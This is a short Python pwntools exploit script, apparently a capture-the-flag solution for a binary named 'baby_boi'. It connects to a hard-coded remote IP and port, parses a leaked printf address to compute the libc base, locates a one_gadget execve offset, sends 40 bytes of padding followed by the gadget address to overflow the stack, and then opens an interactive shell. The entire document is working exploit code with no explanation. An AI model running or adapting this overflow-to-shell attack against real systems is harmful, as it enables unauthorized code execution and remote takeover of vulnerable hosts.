#!/usr/bin/env python

from pwn import *
from one_gadget import generate_one_gadget

path_to_libc = "./libc-2.27.so"
execve_off = []
for offset in generate_one_gadget(path_to_libc):
    execve_off = int(offset)
    break
print hex(execve_off)
p = remote('137.30.124.205', '20000')
#p = process('./baby_boi')
p.recvline()
printf = int(p.recvline().split(" ")[3], 16)
base = printf - 0x64E80
execve = base + execve_off
payload = 'A'*40
payload += p64(execve)
p.sendline(payload)
p.interactive()
